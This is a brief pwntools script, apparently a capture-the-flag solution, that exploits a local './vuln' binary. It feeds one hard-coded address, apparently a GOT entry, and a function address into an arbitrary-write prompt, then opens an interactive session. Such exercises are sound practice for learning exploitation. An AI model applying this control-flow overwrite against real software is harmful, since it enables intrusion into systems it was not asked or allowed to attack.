from pwn import *

ex = './vuln'
elf = ELF(ex)
p = process(ex)

p.sendlineafter("address\n", str(0x804a01c))
p.sendlineafter("value?\n", str(0x080485c6))

p.interactive()
